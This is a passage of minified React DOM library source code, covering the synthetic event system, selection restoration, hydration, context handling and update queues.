    if (e === "click") return no(t)
}

function Cp(e, t) {
    if (e === "input" || e === "change") return no(t)
}

function Tp(e, t) {
    return e === t && (e !== 0 || 1 / e === 1 / t) || e !== e && t !== t
}
var qe = typeof Object.is == "function" ? Object.is : Tp;

function Pr(e, t) {
    if (qe(e, t)) return !0;
    if (typeof e != "object" || e === null || typeof t != "object" || t === null) return !1;
    var n = Object.keys(e),
        r = Object.keys(t);
    if (n.length !== r.length) return !1;
    for (r = 0; r < n.length; r++) {
        var l = n[r];
        if (!Jo.call(t, l) || !qe(e[l], t[l])) return !1
    }
    return !0
}

function bs(e) {
    for (; e && e.firstChild;) e = e.firstChild;
    return e
}

function Es(e, t) {
    var n = bs(e);
    e = 0;
    for (var r; n;) {
        if (n.nodeType === 3) {
            if (r = e + n.textContent.length, e <= t && r >= t) return {
                node: n,
                offset: t - e
            };
            e = r
        }
        e: {
            for (; n;) {
                if (n.nextSibling) {
                    n = n.nextSibling;
                    break e
                }
                n = n.parentNode
            }
            n = void 0
        }
        n = bs(n)
    }
}

function dc(e, t) {
    return e && t ? e === t ? !0 : e && e.nodeType === 3 ? !1 : t && t.nodeType === 3 ? dc(e, t.parentNode) : "contains" in e ? e.contains(t) : e.compareDocumentPosition ? !!(e.compareDocumentPosition(t) & 16) : !1 : !1
}

function fc() {
    for (var e = window, t = Tl(); t instanceof e.HTMLIFrameElement;) {
        try {
            var n = typeof t.contentWindow.location.href == "string"
        } catch {
            n = !1
        }
        if (n) e = t.contentWindow;
        else break;
        t = Tl(e.document)
    }
    return t
}

function ha(e) {
    var t = e && e.nodeName && e.nodeName.toLowerCase();
    return t && (t === "input" && (e.type === "text" || e.type === "search" || e.type === "tel" || e.type === "url" || e.type === "password") || t === "textarea" || e.contentEditable === "true")
}

function Pp(e) {
    var t = fc(),
        n = e.focusedElem,
        r = e.selectionRange;
    if (t !== n && n && n.ownerDocument && dc(n.ownerDocument.documentElement, n)) {
        if (r !== null && ha(n)) {
            if (t = r.start, e = r.end, e === void 0 && (e = t), "selectionStart" in n) n.selectionStart = t, n.selectionEnd = Math.min(e, n.value.length);
            else if (e = (t = n.ownerDocument || document) && t.defaultView || window, e.getSelection) {
                e = e.getSelection();
                var l = n.textContent.length,
                    o = Math.min(r.start, l);
                r = r.end === void 0 ? o : Math.min(r.end, l), !e.extend && o > r && (l = r, r = o, o = l), l = Es(n, o);
                var i = Es(n, r);
                l && i && (e.rangeCount !== 1 || e.anchorNode !== l.node || e.anchorOffset !== l.offset || e.focusNode !== i.node || e.focusOffset !== i.offset) && (t = t.createRange(), t.setStart(l.node, l.offset), e.removeAllRanges(), o > r ? (e.addRange(t), e.extend(i.node, i.offset)) : (t.setEnd(i.node, i.offset), e.addRange(t)))
            }
        }
        for (t = [], e = n; e = e.parentNode;) e.nodeType === 1 && t.push({
            element: e,
            left: e.scrollLeft,
            top: e.scrollTop
        });
        for (typeof n.focus == "function" && n.focus(), n = 0; n < t.length; n++) e = t[n], e.element.scrollLeft = e.left, e.element.scrollTop = e.top
    }
}
var jp = vt && "documentMode" in document && 11 >= document.documentMode,
    yn = null,
    gi = null,
    hr = null,
    yi = !1;

function Ns(e, t, n) {
    var r = n.window === n ? n.document : n.nodeType === 9 ? n : n.ownerDocument;
    yi || yn == null || yn !== Tl(r) || (r = yn, "selectionStart" in r && ha(r) ? r = {
        start: r.selectionStart,
        end: r.selectionEnd
    } : (r = (r.ownerDocument && r.ownerDocument.defaultView || window).getSelection(), r = {
        anchorNode: r.anchorNode,
        anchorOffset: r.anchorOffset,
        focusNode: r.focusNode,
        focusOffset: r.focusOffset
    }), hr && Pr(hr, r) || (hr = r, r = Ol(gi, "onSelect"), 0 < r.length && (t = new fa("onSelect", "select", null, t, n), e.push({
        event: t,
        listeners: r
    }), t.target = yn)))
}

function rl(e, t) {
    var n = {};
    return n[e.toLowerCase()] = t.toLowerCase(), n["Webkit" + e] = "webkit" + t, n["Moz" + e] = "moz" + t, n
}
var wn = {
        animationend: rl("Animation", "AnimationEnd"),
        animationiteration: rl("Animation", "AnimationIteration"),
        animationstart: rl("Animation", "AnimationStart"),
        transitionend: rl("Transition", "TransitionEnd")
    },
    _o = {},
    pc = {};
vt && (pc = document.createElement("div").style, "AnimationEvent" in window || (delete wn.animationend.animation, delete wn.animationiteration.animation, delete wn.animationstart.animation), "TransitionEvent" in window || delete wn.transitionend.transition);

function ro(e) {
    if (_o[e]) return _o[e];
    if (!wn[e]) return e;
    var t = wn[e],
        n;
    for (n in t)
        if (t.hasOwnProperty(n) && n in pc) return _o[e] = t[n];
    return e
}
var mc = ro("animationend"),
    hc = ro("animationiteration"),
    vc = ro("animationstart"),
    gc = ro("transitionend"),
    yc = new Map,
    Cs = "abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");

function Bt(e, t) {
    yc.set(e, t), cn(t, [e])
}
for (var $o = 0; $o < Cs.length; $o++) {
    var Lo = Cs[$o],
        _p = Lo.toLowerCase(),
        $p = Lo[0].toUpperCase() + Lo.slice(1);
    Bt(_p, "on" + $p)
}
Bt(mc, "onAnimationEnd");
Bt(hc, "onAnimationIteration");
Bt(vc, "onAnimationStart");
Bt("dblclick", "onDoubleClick");
Bt("focusin", "onFocus");
Bt("focusout", "onBlur");
Bt(gc, "onTransitionEnd");
Rn("onMouseEnter", ["mouseout", "mouseover"]);
Rn("onMouseLeave", ["mouseout", "mouseover"]);
Rn("onPointerEnter", ["pointerout", "pointerover"]);
Rn("onPointerLeave", ["pointerout", "pointerover"]);
cn("onChange", "change click focusin focusout input keydown keyup selectionchange".split(" "));
cn("onSelect", "focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));
cn("onBeforeInput", ["compositionend", "keypress", "textInput", "paste"]);
cn("onCompositionEnd", "compositionend focusout keydown keypress keyup mousedown".split(" "));
cn("onCompositionStart", "compositionstart focusout keydown keypress keyup mousedown".split(" "));
cn("onCompositionUpdate", "compositionupdate focusout keydown keypress keyup mousedown".split(" "));
var ur = "abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),
    Lp = new Set("cancel close invalid load scroll toggle".split(" ").concat(ur));

function Ts(e, t, n) {
    var r = e.type || "unknown-event";
    e.currentTarget = n, _f(r, t, void 0, e), e.currentTarget = null
}

function wc(e, t) {
    t = (t & 4) !== 0;
    for (var n = 0; n < e.length; n++) {
        var r = e[n],
            l = r.event;
        r = r.listeners;
        e: {
            var o = void 0;
            if (t)
                for (var i = r.length - 1; 0 <= i; i--) {
                    var a = r[i],
                        s = a.instance,
                        u = a.currentTarget;
                    if (a = a.listener, s !== o && l.isPropagationStopped()) break e;
                    Ts(l, a, u), o = s
                } else
                    for (i = 0; i < r.length; i++) {
                        if (a = r[i], s = a.instance, u = a.currentTarget, a = a.listener, s !== o && l.isPropagationStopped()) break e;
                        Ts(l, a, u), o = s
                    }
        }
    }
    if (jl) throw e = pi, jl = !1, pi = null, e
}

function U(e, t) {
    var n = t[bi];
    n === void 0 && (n = t[bi] = new Set);
    var r = e + "__bubble";
    n.has(r) || (xc(t, e, 2, !1), n.add(r))
}

function Fo(e, t, n) {
    var r = 0;
    t && (r |= 4), xc(n, e, r, t)
}
var ll = "_reactListening" + Math.random().toString(36).slice(2);

function jr(e) {
    if (!e[ll]) {
        e[ll] = !0, Tu.forEach(function(n) {
            n !== "selectionchange" && (Lp.has(n) || Fo(n, !1, e), Fo(n, !0, e))
        });
        var t = e.nodeType === 9 ? e : e.ownerDocument;
        t === null || t[ll] || (t[ll] = !0, Fo("selectionchange", !1, t))
    }
}

function xc(e, t, n, r) {
    switch (rc(t)) {
        case 1:
            var l = Qf;
            break;
        case 4:
            l = Kf;
            break;
        default:
            l = ca
    }
    n = l.bind(null, t, n, e), l = void 0, !fi || t !== "touchstart" && t !== "touchmove" && t !== "wheel" || (l = !0), r ? l !== void 0 ? e.addEventListener(t, n, {
        capture: !0,
        passive: l
    }) : e.addEventListener(t, n, !0) : l !== void 0 ? e.addEventListener(t, n, {
        passive: l
    }) : e.addEventListener(t, n, !1)
}

function Oo(e, t, n, r, l) {
    var o = r;
    if (!(t & 1) && !(t & 2) && r !== null) e: for (;;) {
        if (r === null) return;
        var i = r.tag;
        if (i === 3 || i === 4) {
            var a = r.stateNode.containerInfo;
            if (a === l || a.nodeType === 8 && a.parentNode === l) break;
            if (i === 4)
                for (i = r.return; i !== null;) {
                    var s = i.tag;
                    if ((s === 3 || s === 4) && (s = i.stateNode.containerInfo, s === l || s.nodeType === 8 && s.parentNode === l)) return;
                    i = i.return
                }
            for (; a !== null;) {
                if (i = Zt(a), i === null) return;
                if (s = i.tag, s === 5 || s === 6) {
                    r = o = i;
                    continue e
                }
                a = a.parentNode
            }
        }
        r = r.return
    }
    Bu(function() {
        var u = o,
            f = ia(n),
            h = [];
        e: {
            var m = yc.get(e);
            if (m !== void 0) {
                var y = fa,
                    w = e;
                switch (e) {
                    case "keypress":
                        if (yl(n) === 0) break e;
                    case "keydown":
                    case "keyup":
                        y = sp;
                        break;
                    case "focusin":
                        w = "focus", y = To;
                        break;
                    case "focusout":
                        w = "blur", y = To;
                        break;
                    case "beforeblur":
                    case "afterblur":
                        y = To;
                        break;
                    case "click":
                        if (n.button === 2) break e;
                    case "auxclick":
                    case "dblclick":
                    case "mousedown":
                    case "mousemove":
                    case "mouseup":
                    case "mouseout":
                    case "mouseover":
                    case "contextmenu":
                        y = hs;
                        break;
                    case "drag":
                    case "dragend":
                    case "dragenter":
                    case "dragexit":
                    case "dragleave":
                    case "dragover":
                    case "dragstart":
                    case "drop":
                        y = Xf;
                        break;
                    case "touchcancel":
                    case "touchend":
                    case "touchmove":
                    case "touchstart":
                        y = dp;
                        break;
                    case mc:
                    case hc:
                    case vc:
                        y = qf;
                        break;
                    case gc:
                        y = pp;
                        break;
                    case "scroll":
                        y = Yf;
                        break;
                    case "wheel":
                        y = hp;
                        break;
                    case "copy":
                    case "cut":
                    case "paste":
                        y = tp;
                        break;
                    case "gotpointercapture":
                    case "lostpointercapture":
                    case "pointercancel":
                    case "pointerdown":
                    case "pointermove":
                    case "pointerout":
                    case "pointerover":
                    case "pointerup":
                        y = gs
                }
                var x = (t & 4) !== 0,
                    N = !x && e === "scroll",
                    d = x ? m !== null ? m + "Capture" : null : m;
                x = [];
                for (var c = u, p; c !== null;) {
                    p = c;
                    var k = p.stateNode;
                    if (p.tag === 5 && k !== null && (p = k, d !== null && (k = br(c, d), k != null && x.push(_r(c, k, p)))), N) break;
                    c = c.return
                }
                0 < x.length && (m = new y(m, w, null, n, f), h.push({
                    event: m,
                    listeners: x
                }))
            }
        }
        if (!(t & 7)) {
            e: {
                if (m = e === "mouseover" || e === "pointerover", y = e === "mouseout" || e === "pointerout", m && n !== ci && (w = n.relatedTarget || n.fromElement) && (Zt(w) || w[gt])) break e;
                if ((y || m) && (m = f.window === f ? f : (m = f.ownerDocument) ? m.defaultView || m.parentWindow : window, y ? (w = n.relatedTarget || n.toElement, y = u, w = w ? Zt(w) : null, w !== null && (N = dn(w), w !== N || w.tag !== 5 && w.tag !== 6) && (w = null)) : (y = null, w = u), y !== w)) {
                    if (x = hs, k = "onMouseLeave", d = "onMouseEnter", c = "mouse", (e === "pointerout" || e === "pointerover") && (x = gs, k = "onPointerLeave", d = "onPointerEnter", c = "pointer"), N = y == null ? m : xn(y), p = w == null ? m : xn(w), m = new x(k, c + "leave", y, n, f), m.target = N, m.relatedTarget = p, k = null, Zt(f) === u && (x = new x(d, c + "enter", w, n, f), x.target = p, x.relatedTarget = N, k = x), N = k, y && w) t: {
                        for (x = y, d = w, c = 0, p = x; p; p = pn(p)) c++;
                        for (p = 0, k = d; k; k = pn(k)) p++;
                        for (; 0 < c - p;) x = pn(x),
                        c--;
                        for (; 0 < p - c;) d = pn(d),
                        p--;
                        for (; c--;) {
                            if (x === d || d !== null && x === d.alternate) break t;
                            x = pn(x), d = pn(d)
                        }
                        x = null
                    }
                    else x = null;
                    y !== null && Ps(h, m, y, x, !1), w !== null && N !== null && Ps(h, N, w, x, !0)
                }
            }
            e: {
                if (m = u ? xn(u) : window, y = m.nodeName && m.nodeName.toLowerCase(), y === "select" || y === "input" && m.type === "file") var b = Sp;
                else if (xs(m))
                    if (uc) b = Cp;
                    else {
                        b = Ep;
                        var C = bp
                    }
                else(y = m.nodeName) && y.toLowerCase() === "input" && (m.type === "checkbox" || m.type === "radio") && (b = Np);
                if (b && (b = b(e, u))) {
                    sc(h, b, n, f);
                    break e
                }
                C && C(e, m, u),
                e === "focusout" && (C = m._wrapperState) && C.controlled && m.type === "number" && oi(m, "number", m.value)
            }
            switch (C = u ? xn(u) : window, e) {
                case "focusin":
                    (xs(C) || C.contentEditable === "true") && (yn = C, gi = u, hr = null);
                    break;
                case "focusout":
                    hr = gi = yn = null;
                    break;
                case "mousedown":
                    yi = !0;
                    break;
                case "contextmenu":
                case "mouseup":
                case "dragend":
                    yi = !1, Ns(h, n, f);
                    break;
                case "selectionchange":
                    if (jp) break;
                case "keydown":
                case "keyup":
                    Ns(h, n, f)
            }
            var T;
            if (ma) e: {
                switch (e) {
                    case "compositionstart":
                        var E = "onCompositionStart";
                        break e;
                    case "compositionend":
                        E = "onCompositionEnd";
                        break e;
                    case "compositionupdate":
                        E = "onCompositionUpdate";
                        break e
                }
                E = void 0
            }
            else gn ? ic(e, n) && (E = "onCompositionEnd") : e === "keydown" && n.keyCode === 229 && (E = "onCompositionStart");E && (oc && n.locale !== "ko" && (gn || E !== "onCompositionStart" ? E === "onCompositionEnd" && gn && (T = lc()) : (_t = f, da = "value" in _t ? _t.value : _t.textContent, gn = !0)), C = Ol(u, E), 0 < C.length && (E = new vs(E, e, null, n, f), h.push({
                event: E,
                listeners: C
            }), T ? E.data = T : (T = ac(n), T !== null && (E.data = T)))),
            (T = gp ? yp(e, n) : wp(e, n)) && (u = Ol(u, "onBeforeInput"), 0 < u.length && (f = new vs("onBeforeInput", "beforeinput", null, n, f), h.push({
                event: f,
                listeners: u
            }), f.data = T))
        }
        wc(h, t)
    })
}

function _r(e, t, n) {
    return {
        instance: e,
        listener: t,
        currentTarget: n
    }
}

function Ol(e, t) {
    for (var n = t + "Capture", r = []; e !== null;) {
        var l = e,
            o = l.stateNode;
        l.tag === 5 && o !== null && (l = o, o = br(e, n), o != null && r.unshift(_r(e, o, l)), o = br(e, t), o != null && r.push(_r(e, o, l))), e = e.return
    }
    return r
}

function pn(e) {
    if (e === null) return null;
    do e = e.return; while (e && e.tag !== 5);
    return e || null
}

function Ps(e, t, n, r, l) {
    for (var o = t._reactName, i = []; n !== null && n !== r;) {
        var a = n,
            s = a.alternate,
            u = a.stateNode;
        if (s !== null && s === r) break;
        a.tag === 5 && u !== null && (a = u, l ? (s = br(n, o), s != null && i.unshift(_r(n, s, a))) : l || (s = br(n, o), s != null && i.push(_r(n, s, a)))), n = n.return
    }
    i.length !== 0 && e.push({
        event: t,
        listeners: i
    })
}
var Fp = /\r\n?/g,
    Op = /\u0000|\uFFFD/g;

function js(e) {
    return (typeof e == "string" ? e : "" + e).replace(Fp, `
`).replace(Op, "")
}

function ol(e, t, n) {
    if (t = js(t), js(e) !== t && n) throw Error(S(425))
}

function Rl() {}
var wi = null,
    xi = null;

function ki(e, t) {
    return e === "textarea" || e === "noscript" || typeof t.children == "string" || typeof t.children == "number" || typeof t.dangerouslySetInnerHTML == "object" && t.dangerouslySetInnerHTML !== null && t.dangerouslySetInnerHTML.__html != null
}
var Si = typeof setTimeout == "function" ? setTimeout : void 0,
    Rp = typeof clearTimeout == "function" ? clearTimeout : void 0,
    _s = typeof Promise == "function" ? Promise : void 0,
    Mp = typeof queueMicrotask == "function" ? queueMicrotask : typeof _s < "u" ? function(e) {
        return _s.resolve(null).then(e).catch(zp)
    } : Si;

function zp(e) {
    setTimeout(function() {
        throw e
    })
}

function Ro(e, t) {
    var n = t,
        r = 0;
    do {
        var l = n.nextSibling;
        if (e.removeChild(n), l && l.nodeType === 8)
            if (n = l.data, n === "/$") {
                if (r === 0) {
                    e.removeChild(l), Cr(t);
                    return
                }
                r--
            } else n !== "$" && n !== "$?" && n !== "$!" || r++;
        n = l
    } while (n);
    Cr(t)
}

function Mt(e) {
    for (; e != null; e = e.nextSibling) {
        var t = e.nodeType;
        if (t === 1 || t === 3) break;
        if (t === 8) {
            if (t = e.data, t === "$" || t === "$!" || t === "$?") break;
            if (t === "/$") return null
        }
    }
    return e
}

function $s(e) {
    e = e.previousSibling;
    for (var t = 0; e;) {
        if (e.nodeType === 8) {
            var n = e.data;
            if (n === "$" || n === "$!" || n === "$?") {
                if (t === 0) return e;
                t--
            } else n === "/$" && t++
        }
        e = e.previousSibling
    }
    return null
}
var Qn = Math.random().toString(36).slice(2),
    rt = "__reactFiber$" + Qn,
    $r = "__reactProps$" + Qn,
    gt = "__reactContainer$" + Qn,
    bi = "__reactEvents$" + Qn,
    Dp = "__reactListeners$" + Qn,
    Ip = "__reactHandles$" + Qn;

function Zt(e) {
    var t = e[rt];
    if (t) return t;
    for (var n = e.parentNode; n;) {
        if (t = n[gt] || n[rt]) {
            if (n = t.alternate, t.child !== null || n !== null && n.child !== null)
                for (e = $s(e); e !== null;) {
                    if (n = e[rt]) return n;
                    e = $s(e)
                }
            return t
        }
        e = n, n = e.parentNode
    }
    return null
}

function Br(e) {
    return e = e[rt] || e[gt], !e || e.tag !== 5 && e.tag !== 6 && e.tag !== 13 && e.tag !== 3 ? null : e
}

function xn(e) {
    if (e.tag === 5 || e.tag === 6) return e.stateNode;
    throw Error(S(33))
}

function lo(e) {
    return e[$r] || null
}
var Ei = [],
    kn = -1;

function Ht(e) {
    return {
        current: e
    }
}

function B(e) {
    0 > kn || (e.current = Ei[kn], Ei[kn] = null, kn--)
}

function W(e, t) {
    kn++, Ei[kn] = e.current, e.current = t
}
var Ut = {},
    ve = Ht(Ut),
    Ce = Ht(!1),
    ln = Ut;

function Mn(e, t) {
    var n = e.type.contextTypes;
    if (!n) return Ut;
    var r = e.stateNode;
    if (r && r.__reactInternalMemoizedUnmaskedChildContext === t) return r.__reactInternalMemoizedMaskedChildContext;
    var l = {},
        o;
    for (o in n) l[o] = t[o];
    return r && (e = e.stateNode, e.__reactInternalMemoizedUnmaskedChildContext = t, e.__reactInternalMemoizedMaskedChildContext = l), l
}

function Te(e) {
    return e = e.childContextTypes, e != null
}

function Ml() {
    B(Ce), B(ve)
}

function Ls(e, t, n) {
    if (ve.current !== Ut) throw Error(S(168));
    W(ve, t), W(Ce, n)
}

function kc(e, t, n) {
    var r = e.stateNode;
    if (t = t.childContextTypes, typeof r.getChildContext != "function") return n;
    r = r.getChildContext();
    for (var l in r)
        if (!(l in t)) throw Error(S(108, bf(e) || "Unknown", l));
    return K({}, n, r)
}

function zl(e) {
    return e = (e = e.stateNode) && e.__reactInternalMemoizedMergedChildContext || Ut, ln = ve.current, W(ve, e), W(Ce, Ce.current), !0
}

function Fs(e, t, n) {
    var r = e.stateNode;
    if (!r) throw Error(S(169));
    n ? (e = kc(e, t, ln), r.__reactInternalMemoizedMergedChildContext = e, B(Ce), B(ve), W(ve, e)) : B(Ce), W(Ce, n)
}
var dt = null,
    oo = !1,
    Mo = !1;

function Sc(e) {
    dt === null ? dt = [e] : dt.push(e)
}

function Ap(e) {
    oo = !0, Sc(e)
}

function Vt() {
    if (!Mo && dt !== null) {
        Mo = !0;
        var e = 0,
            t = I;
        try {
            var n = dt;
            for (I = 1; e < n.length; e++) {
                var r = n[e];
                do r = r(!0); while (r !== null)
            }
            dt = null, oo = !1
        } catch (l) {
            throw dt !== null && (dt = dt.slice(e + 1)), Ku(aa, Vt), l
        } finally {
            I = t, Mo = !1
        }
    }
    return null
}
var Sn = [],
    bn = 0,
    Dl = null,
    Il = 0,
    Ie = [],
    Ae = 0,
    on = null,
    ft = 1,
    pt = "";

function Gt(e, t) {
    Sn[bn++] = Il, Sn[bn++] = Dl, Dl = e, Il = t
}

function bc(e, t, n) {
    Ie[Ae++] = ft, Ie[Ae++] = pt, Ie[Ae++] = on, on = e;
    var r = ft;
    e = pt;
    var l = 32 - Ze(r) - 1;
    r &= ~(1 << l), n += 1;
    var o = 32 - Ze(t) + l;
    if (30 < o) {
        var i = l - l % 5;
        o = (r & (1 << i) - 1).toString(32), r >>= i, l -= i, ft = 1 << 32 - Ze(t) + l | n << l | r, pt = o + e
    } else ft = 1 << o | n << l | r, pt = e
}

function va(e) {
    e.return !== null && (Gt(e, 1), bc(e, 1, 0))
}

function ga(e) {
    for (; e === Dl;) Dl = Sn[--bn], Sn[bn] = null, Il = Sn[--bn], Sn[bn] = null;
    for (; e === on;) on = Ie[--Ae], Ie[Ae] = null, pt = Ie[--Ae], Ie[Ae] = null, ft = Ie[--Ae], Ie[Ae] = null
}
var Fe = null,
    Le = null,
    H = !1,
    Xe = null;

function Ec(e, t) {
    var n = We(5, null, null, 0);
    n.elementType = "DELETED", n.stateNode = t, n.return = e, t = e.deletions, t === null ? (e.deletions = [n], e.flags |= 16) : t.push(n)
}

function Os(e, t) {
    switch (e.tag) {
        case 5:
            var n = e.type;
            return t = t.nodeType !== 1 || n.toLowerCase() !== t.nodeName.toLowerCase() ? null : t, t !== null ? (e.stateNode = t, Fe = e, Le = Mt(t.firstChild), !0) : !1;
        case 6:
            return t = e.pendingProps === "" || t.nodeType !== 3 ? null : t, t !== null ? (e.stateNode = t, Fe = e, Le = null, !0) : !1;
        case 13:
            return t = t.nodeType !== 8 ? null : t, t !== null ? (n = on !== null ? {
                id: ft,
                overflow: pt
            } : null, e.memoizedState = {
                dehydrated: t,
                treeContext: n,
                retryLane: 1073741824
            }, n = We(18, null, null, 0), n.stateNode = t, n.return = e, e.child = n, Fe = e, Le = null, !0) : !1;
        default:
            return !1
    }
}

function Ni(e) {
    return (e.mode & 1) !== 0 && (e.flags & 128) === 0
}

function Ci(e) {
    if (H) {
        var t = Le;
        if (t) {
            var n = t;
            if (!Os(e, t)) {
                if (Ni(e)) throw Error(S(418));
                t = Mt(n.nextSibling);
                var r = Fe;
                t && Os(e, t) ? Ec(r, n) : (e.flags = e.flags & -4097 | 2, H = !1, Fe = e)
            }
        } else {
            if (Ni(e)) throw Error(S(418));
            e.flags = e.flags & -4097 | 2, H = !1, Fe = e
        }
    }
}

function Rs(e) {
    for (e = e.return; e !== null && e.tag !== 5 && e.tag !== 3 && e.tag !== 13;) e = e.return;
    Fe = e
}

function il(e) {
    if (e !== Fe) return !1;
    if (!H) return Rs(e), H = !0, !1;
    var t;
    if ((t = e.tag !== 3) && !(t = e.tag !== 5) && (t = e.type, t = t !== "head" && t !== "body" && !ki(e.type, e.memoizedProps)), t && (t = Le)) {
        if (Ni(e)) throw Nc(), Error(S(418));
        for (; t;) Ec(e, t), t = Mt(t.nextSibling)
    }
    if (Rs(e), e.tag === 13) {
        if (e = e.memoizedState, e = e !== null ? e.dehydrated : null, !e) throw Error(S(317));
        e: {
            for (e = e.nextSibling, t = 0; e;) {
                if (e.nodeType === 8) {
                    var n = e.data;
                    if (n === "/$") {
                        if (t === 0) {
                            Le = Mt(e.nextSibling);
                            break e
                        }
                        t--
                    } else n !== "$" && n !== "$!" && n !== "$?" || t++
                }
                e = e.nextSibling
            }
            Le = null
        }
    } else Le = Fe ? Mt(e.stateNode.nextSibling) : null;
    return !0
}

function Nc() {
    for (var e = Le; e;) e = Mt(e.nextSibling)
}

function zn() {
    Le = Fe = null, H = !1
}

function ya(e) {
    Xe === null ? Xe = [e] : Xe.push(e)
}
var Wp = xt.ReactCurrentBatchConfig;

function Ye(e, t) {
    if (e && e.defaultProps) {
        t = K({}, t), e = e.defaultProps;
        for (var n in e) t[n] === void 0 && (t[n] = e[n]);
        return t
    }
    return t
}
var Al = Ht(null),
    Wl = null,
    En = null,
    wa = null;

function xa() {
    wa = En = Wl = null
}

function ka(e) {
    var t = Al.current;
    B(Al), e._currentValue = t
}

function Ti(e, t, n) {
    for (; e !== null;) {
        var r = e.alternate;
        if ((e.childLanes & t) !== t ? (e.childLanes |= t, r !== null && (r.childLanes |= t)) : r !== null && (r.childLanes & t) !== t && (r.childLanes |= t), e === n) break;
        e = e.return
    }
}

function Fn(e, t) {
    Wl = e, wa = En = null, e = e.dependencies, e !== null && e.firstContext !== null && (e.lanes & t && (Ne = !0), e.firstContext = null)
}

function He(e) {
    var t = e._currentValue;
    if (wa !== e)
        if (e = {
                context: e,
                memoizedValue: t,
                next: null
            }, En === null) {
            if (Wl === null) throw Error(S(308));
            En = e, Wl.dependencies = {
                lanes: 0,
                firstContext: e
            }
        } else En = En.next = e;
    return t
}
var Jt = null;

function Sa(e) {
    Jt === null ? Jt = [e] : Jt.push(e)
}

function Cc(e, t, n, r) {
    var l = t.interleaved;
    return l === null ? (n.next = n, Sa(t)) : (n.next = l.next, l.next = n), t.interleaved = n, yt(e, r)
}

function yt(e, t) {
    e.lanes |= t;
    var n = e.alternate;
    for (n !== null && (n.lanes |= t), n = e, e = e.return; e !== null;) e.childLanes |= t, n = e.alternate, n !== null && (n.childLanes |= t), n = e, e = e.return;
    return n.tag === 3 ? n.stateNode : null
}
var Ct = !1;

function ba(e) {
    e.updateQueue = {
        baseState: e.memoizedState,
        firstBaseUpdate: null,
        lastBaseUpdate: null,
        shared: {
            pending: null,
            interleaved: null,
            lanes: 0
        },
        effects: null
    }
}

function Tc(e, t) {
    e = e.updateQueue, t.updateQueue === e && (t.updateQueue = {
        baseState: e.baseState,
        firstBaseUpdate: e.firstBaseUpdate,
        lastBaseUpdate: e.lastBaseUpdate,
        shared: e.shared,
        effects: e.effects
    })
}

function mt(e, t) {
    return {
        eventTime: e,
        lane: t,
        tag: 0,
        payload: null,
        callback: null,
        next: null
    }
}

function zt(e, t, n) {
    var r = e.updateQueue;
    if (r === null) return null;
    if (r = r.shared, M & 2) {
        var l = r.pending;
        return l === null ? t.next = t : (t.next = l.next, l.next = t), r.pending = t, yt(e, n)
    }
    return l = r.interleaved, l === null ? (t.next = t, Sa(r)) : (t.next = l.next, l.next = t), r.interleaved = t, yt(e, n)
}

function wl(e, t, n) {
    if (t = t.updateQueue, t !== null && (t = t.shared, (n & 4194240) !== 0)) {
        var r = t.lanes;
        r &= e.pendingLanes, n |= r, t.lanes = n, sa(e, n)
    }
}

function Ms(e, t) {
    var n = e.updateQueue,
        r = e.alternate;
    if (r !== null && (r = r.updateQueue, n === r)) {
        var l = null,
            o = null;
        if (n = n.firstBaseUpdate, n !== null) {
            do {
                var i = {
                    eventTime: n.eventTime,
                    lane: n.lane,
                    tag: n.tag,
                    payload: n.payload,
                    callback: n.callback,
                    next: null
                };
                o === null ? l = o = i : o = o.next = i, n = n.next
            } while (n !== null);
            o === null ? l = o = t : o = o.next = t
        } else l = o = t;
        n = {
            baseState: r.baseState,
            firstBaseUpdate: l,
            lastBaseUpdate: o,
            shared: r.shared,
            effects: r.effects
        }, e.updateQueue = n;
        return
    }
    e = n.lastBaseUpdate, e === null ? n.firstBaseUpdate = t : e.next = t, n.lastBaseUpdate = t
}

function Ul(e, t, n, r) {
    var l = e.updateQueue;
    Ct = !1;
    var o = l.firstBaseUpdate,
        i = l.lastBaseUpdate,
        a = l.shared.pending;
    if (a !== null) {
        l.shared.pending = null;
        var s = a,
            u = s.next;
        s.next = null, i === null ? o = u : i.next = u, i = s;
        var f = e.alternate;
        f !== null && (f = f.updateQueue, a = f.lastBaseUpdate, a !== i && (a === null ? f.firstBaseUpdate = u : a.next = u, f.lastBaseUpdate = s))
    }
    if (o !== null) {
        var h = l.baseState;
        i = 0, f = u = s = null, a = o;
        do {
            var m = a.lane,
                y = a.eventTime;
            if ((r & m) === m) {
                f !== null && (f = f.next = {
                    eventTime: y,
                    lane: 0,
                    tag: a.tag,
                    payload: a.payload,
                    callback: a.callback,
                    next: null
                });
                e: {
                    var w = e,
                        x = a;
                    switch (m = t, y = n, x.tag) {
                        case 1:
                            if (w = x.payload, typeof w == "function") {
                                h = w.call(y, h, m);
                                break e
                            }
                            h = w;
                            break e;
                        case 3:
                            w.flags = w.flags & -65537 | 128;
                        case 0:
                            if (w = x.payload, m = typeof w == "function" ? w.call(y, h, m) : w, m == null) break e;
                            h = K({}, h, m);
                            break e;
                        case 2:
                            Ct = !0
                    }
                }
                a.callback !== null && a.lane !== 0 && (e.flags |= 64, m = l.effects, m === null ? l.effects = [a] : m.push(a))
            } else y = {
                eventTime: y,
                lane: m,
                tag: a.tag,
                payload: a.payload,
                callback: a.callback,
                next: null
            }, f === null ? (u = f = y, s = h) : f = f.next = y, i |= m;
            if (a = a.next, a === null) {
                if (a = l.shared.pending, a === null) break;
                m = a, a = m.next, m.next = null, l.lastBaseUpdate = m, l.shared.pending = null
            }
        } while (1);
        if (f === null && (s = h), l.baseState = s, l.firstBaseUpdate = u, l.lastBaseUpdate = f, t = l.shared.interleaved, t !== null) {
            l = t;
            do i |= l.lane, l = l.next; while (l !== t)
        } else o === null && (l.shared.lanes = 0);
        sn |= i, e.lanes = i, e.memoizedState = h
    }
}

function zs(e, t, n) {
    if (e = t.effects, t.effects = null, e !== null)
        for (t = 0; t < e.length; t++) {
            var r = e[t],
                l = r.callback;
            if (l !== null) {
